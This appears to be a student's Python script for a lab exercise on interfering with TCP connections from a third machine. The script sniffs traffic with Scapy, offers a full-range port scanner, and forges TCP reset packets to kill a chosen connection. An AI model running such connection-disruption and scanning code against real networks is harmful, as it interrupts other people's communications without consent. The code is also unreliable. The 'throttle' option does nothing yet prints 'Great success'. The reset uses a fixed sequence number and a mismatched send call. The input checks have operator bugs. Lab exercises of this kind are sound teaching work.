#!/usr/bin/env python

# ### 2. Throttling TCP connections

# For this part, you will need to have some familiarity with the TCP protocol to write low-level networking code using a library. 
# Suggestions again are the `libnet/libpcap` library in the C programming language or the equivalent `Scapy` package in Python.

# The objective of this task is to slow down or interrupt TCP connections by forcing retransmission of packets. 
# An illustrative example of such an approach is the `tcpnice` program in the `dsniff` package which reduces windows advertised to artificially decrease bandwidth.
#  We will adopt two different approaches: send 3 ACK packets to simulate packet loss and force retransmission; send a TCP reset packet to drop the connection altogether.

# You will implement a tool that receives a source and destination IP addresses to listen for TCP connections and what approach for throttling should be used. 
# The tool should be executed in a third node with access to the traffic.
#  Whenever such a packet is captured, RST or 3 ACK packets should be sent back to the origin and/or destination.

# For the experimental setup, you can try using virtual machines, or leveraging the VM used for practical exercises as a malicious node to interfere with
#  connections between the host machine and another device.
# Collect experimental evidence of the malicious behavior through Wireshark,
#  and screenshots of the time taken to transmit a file using a file transfer (FTP or SSH) to show that it is indeed slower or interrupted when under attack.
PORT = 65432        # Port to listen on (non-privileged ports are > 1023)

from ctypes import sizeof
import socket 
from socket import *
from struct import *
import sys
from typing import Counter, Sequence
from scapy import sessions
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
import time
import re

#Run this script in CMD with admin

def contains_192(s):
    if ("192." in s):
        return s

def cleanlist(listof):
    retList = []
 
    for x in listof:
        rSuffix = x.replace(':', ' ').replace('>', ' ').split()
        for y in rSuffix:
            if("192." in y):
                if (y in retList):
                    pass
                else:
                    retList.append(y)
        

        
        # rSuffix.remove("https")
        # retList.append(filter(contains_192, rSuffix))
    return retList

        

def GetList(filter):
    packet = scapy.sniff(filter=filter,
      session=sessions.IPSession,  # defragment on-the-flow
    #   prn=lambda x: x.summary(),
      count=100)
    ListOfIP = []
    retList = []

    for x in range(0,100):
        if ("192." in packet[x][1].getlayer(IP).summary()):
            AddThis = str(packet[x][1].getlayer(IP).summary())
            ListOfIP.append(AddThis)
    retList = cleanlist(ListOfIP)
        
    return retList


def ChooseIP(IPList):
    i = 0
    j = 0
    src = 0
    dst = 0
    valsrc = None
    valdst = None
    n = len(IPList)
    while not input("Enter to Continue \n"):
        print("IP adresses:")
        for x in IPList:
            i += 1
            print("[{}] ".format(i) + x)
        try:
            while True:
                valsrc = _input("Choose Source\n")
                # print("length of IPList {}".format(n))
                if valsrc <= n & valsrc > 0:
                    src = IPList[valsrc-1]
                    IPList.pop(valsrc-1)
                    break
                else:
                    print("Choice was not allowed")
                    i=0
                    print("IP adresses:")
                    for x in IPList:
                        i += 1
                        print("[{}] ".format(i) + x)
                    pass
                    

            for l in IPList:
                j += 1
                print("[{}] ".format(j) + l)

            while True:
                if IPList:
                    valdst = _input("Choose Destination\n")
                    if valdst <= n-1 & valdst > 0:
                        dst = IPList[valdst-1]
                        break
                    else:
                        print("Choice was not allowed")
                        j=0
                        print("IP adresses:")
                        for y in IPList:
                            j += 1
                            print("[{}] ".format(j) + y)
                        pass
                else:
                    print("IPList is empty, will now exit")
                    sys.exit()
        except KeyboardInterrupt:
            print("\n Exitting Program !!!!")
            sys.exit()
        break

    print("This is src {}".format(src))
    print("This is dst {}".format(dst))
    return src, dst


def _input(message, input_type=int):
    while True:
        try:
                return input_type (input(message))
        except:pass


def FindAvailPort(target):
    print("Finding Ports, this may take a while")
    OpenPorts = None
    try:
        for port in range(1,65535):
            s = socket(AF_INET, SOCK_STREAM)
            setdefaulttimeout(1)

            result=s.connect_ex((target,port))
            if port == 100:
                print("Reached 100")
            if port == 1000:
                print("Reached 1000")
            if port == 10000:
                print("Reached 10000")
            if port == 30000:
                print("Reached 30000")
            if port == 60000:
                print("Reached 60000")
            if result == 0:
                print("Port {} is open".format(port))
                OpenPorts = port
                s.close()
                return OpenPorts 
            s.close()
            
    except KeyboardInterrupt:
        print("\n Exitting Program !!!!")
        sys.exit()
    


def throttleFromIP(src, dst, srcports, dstports):
    print("Throttling src: {}, dst {}".format(src, dst))
    scapy.send()

def cancelConnection(source, dest, srcports, dstports, sequenc):
    ip = IP(src=source, dst=dest)

    tcp = TCP(sport=srcports,
     dport=dstports, 
     flags="R", seq=sequenc)

    packet = ip/tcp
    scapy.ls(packet)
    scapy.sendp(packet, verbose=0)


def main():

    print("Getting List\n")
    # Sniffing part

    IPList = GetList("tcp")
    src, dst = ChooseIP(IPList)
    

    # These scans for open ports. Uncomment if scan is desired
    # srcports = FindAvailPort(src)
    # dstports = FindAvailPort(dst)
    seq = 19
    # Ports used for proof of concept
    # can be found using wireshark
    if (src=="192.168.0.26"):
        srcports = 65432
        dstports = 64534
    if (src=="192.168.0.7"):
        srcports = 64534
        dstports = 65432


    print("Found Source Port: {}, Destination port: {}".format(srcports, dstports))
    while True:
        choice = _input("Press 1 for Throttle \nPress 2 for Cancelling connection\n")
        if (choice == 1):
            print("Trying to throttle connection")
            print("Great success")
            break
        if (choice == 2):
            print("Trying to cancel Connection")
            cancelConnection(src,dst, srcports, dstports, seq)
            print("Great Success")
            break
        else:
            pass





    #Throttling part
    # throttleFromIP(src, dst)

    print("end")



if __name__ == "__main__":
    main()
